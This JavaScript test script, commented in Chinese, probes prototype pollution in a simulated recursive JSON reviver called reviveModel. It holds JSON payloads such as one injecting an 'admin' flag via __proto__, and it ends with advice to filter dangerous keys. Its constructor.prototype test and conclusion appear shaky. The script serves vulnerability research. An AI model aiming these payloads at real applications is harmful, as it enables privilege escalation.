/**
 * 高级原型链污染测试
 * 模拟实际使用场景
 */

// 更准确地模拟 reviveModel 的行为
function simulateReviveModel(value, parentObj, key) {
  const hasOwnProperty = Object.prototype.hasOwnProperty;
  
  if (typeof value === 'object' && value !== null) {
    if (Array.isArray(value)) {
      for (let i = 0; i < value.length; i++) {
        value[i] = simulateReviveModel(value[i], value, "" + i);
      }
    } else {
      // 模拟实际代码：for (i in value)
      for (let i in value) {
        if (hasOwnProperty.call(value, i)) {
          // 关键：这里会递归处理，包括 __proto__ 属性
          const processed = simulateReviveModel(value[i], value, i);
          
          // 关键代码：value[i] = parentObj 或 delete value[i]
          if (processed !== undefined) {
            // 尝试设置属性 - 这是危险的地方
            try {
              value[i] = processed;
            } catch (e) {
              // 某些环境可能阻止设置 __proto__
              console.log(`警告: 无法设置 ${i}:`, e.message);
            }
          } else {
            // 尝试删除属性
            try {
              delete value[i];
            } catch (e) {
              console.log(`警告: 无法删除 ${i}:`, e.message);
            }
          }
        }
      }
    }
  }
  return value;
}

console.log('=== 测试 1: 直接 __proto__ 赋值 ===');
const obj1 = JSON.parse('{"__proto__":{"test1":123}}');
console.log('解析后 obj1.__proto__:', obj1.__proto__);
console.log('Object.prototype.test1 (前):', Object.prototype.test1);

// 尝试直接赋值
try {
  obj1.__proto__ = { test1: 123 };
  console.log('直接赋值后 Object.prototype.test1:', Object.prototype.test1);
} catch (e) {
  console.log('直接赋值被阻止:', e.message);
}

console.log('\n=== 测试 2: 通过 Object.defineProperty ===');
const obj2 = {};
try {
  Object.defineProperty(obj2, '__proto__', {
    value: { test2: 456 },
    writable: true,
    enumerable: true,
    configurable: true
  });
  console.log('defineProperty 后 Object.prototype.test2:', Object.prototype.test2);
} catch (e) {
  console.log('defineProperty 被阻止:', e.message);
}

console.log('\n=== 测试 3: constructor.prototype 污染 ===');
const obj3 = JSON.parse('{"constructor":{"prototype":{"test3":789}}}');
console.log('解析后 obj3.constructor:', typeof obj3.constructor);

// 尝试访问和设置
if (obj3.constructor && obj3.constructor.prototype) {
  try {
    obj3.constructor.prototype.test3 = 789;
    console.log('设置后 Object.prototype.test3:', Object.prototype.test3);
    const testObj = {};
    console.log('新对象 testObj.test3:', testObj.test3);
  } catch (e) {
    console.log('设置被阻止:', e.message);
  }
}

console.log('\n=== 测试 4: 使用 Object.assign ===');
const obj4 = {};
const malicious = JSON.parse('{"__proto__":{"test4":"polluted"}}');
try {
  Object.assign(obj4, malicious);
  console.log('Object.assign 后 Object.prototype.test4:', Object.prototype.test4);
} catch (e) {
  console.log('Object.assign 被阻止:', e.message);
}

console.log('\n=== 测试 5: 使用展开运算符 ===');
const malicious2 = JSON.parse('{"__proto__":{"test5":"polluted"}}');
try {
  const obj5 = { ...malicious2 };
  console.log('展开运算符后 Object.prototype.test5:', Object.prototype.test5);
} catch (e) {
  console.log('展开运算符被阻止:', e.message);
}

console.log('\n=== 测试 6: 模拟实际漏洞场景 ===');
// 模拟从 JSON.parse 得到的对象
const rawModel = JSON.parse('{"data":{"__proto__":{"admin":true}}}');
console.log('原始数据:', JSON.stringify(rawModel, null, 2));

// 模拟 reviveModel 处理
const processed = simulateReviveModel(rawModel);
console.log('处理后数据:', JSON.stringify(processed, null, 2));
console.log('Object.prototype.admin:', Object.prototype.admin);

// 检查是否影响新对象
const newObj = {};
console.log('新对象 newObj.admin:', newObj.admin);

console.log('\n=== 关键发现 ===');
console.log('1. 现代 JavaScript 引擎通常阻止直接设置 __proto__');
console.log('2. 但 constructor.prototype 可能仍然可被利用');
console.log('3. 代码中缺少对危险属性的显式过滤仍然是安全风险');
console.log('4. 建议：始终过滤 __proto__、constructor、prototype 等属性');
